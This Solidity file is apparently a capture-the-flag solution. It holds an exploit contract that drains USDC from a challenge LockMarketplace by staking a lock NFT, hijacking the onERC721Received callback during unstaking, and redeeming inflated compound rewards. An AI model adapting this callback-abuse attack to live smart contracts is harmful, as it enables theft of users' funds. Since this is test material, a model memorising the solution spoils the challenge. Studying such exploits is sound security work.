// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "src/LockMarketplace.sol";
import "src/LockToken.sol";
import "src/Challenge.sol";
import { console } from "forge-std/console.sol";

contract Exploit {

    Challenge private immutable CHALLENGE;
    IERC20 usdc;
    IERC20 cusdc;
    LockMarketplace lockMarketplace;
    LockToken lockToken;

    bool active;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external payable {
        usdc = CHALLENGE.USDC();
        cusdc = CHALLENGE.CUSDC();
        lockMarketplace = CHALLENGE.LOCK_MARKETPLACE();
        lockToken = CHALLENGE.LOCK_TOKEN();

        usdc.approve(address(lockMarketplace), type(uint).max);
        uint nftId = lockMarketplace.mintWithUSDC(address(this), 120e6);
        lockMarketplace.withdrawUSDC(nftId, 70e6);
        lockToken.approve(address(lockMarketplace), nftId);
        lockMarketplace.stake(nftId, 30e6);

        active = true;
        lockMarketplace.unStake(address(this), nftId);

        nftId = lockMarketplace.mintWithUSDC(address(this), 120e6);
        lockMarketplace.withdrawUSDC(nftId, 100e6);
        lockMarketplace.redeemCompoundRewards(nftId, lockMarketplace.getAvailableRewards(address(this)));

        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external returns (bytes4) {
        if (active) {
            lockToken.transferFrom(address(this), address(CHALLENGE), id);
            active = false;
        }
        return this.onERC721Received.selector;
    }
}